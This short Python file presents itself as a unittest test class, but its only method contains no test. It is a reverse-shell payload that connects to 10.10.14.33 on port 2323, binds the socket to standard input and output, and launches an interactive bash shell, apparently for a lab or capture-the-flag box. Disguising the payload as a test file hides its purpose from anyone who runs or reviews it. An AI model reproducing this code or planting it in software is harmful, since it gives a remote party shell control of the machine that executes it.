import unittest
import socket,subprocess,os

class TestShell(unittest.TestCase):
    def add_test(self):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.10.14.33",2323))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/usr/bin/bash","-i"])

if __name__ == '__main__':
    unittest.main()

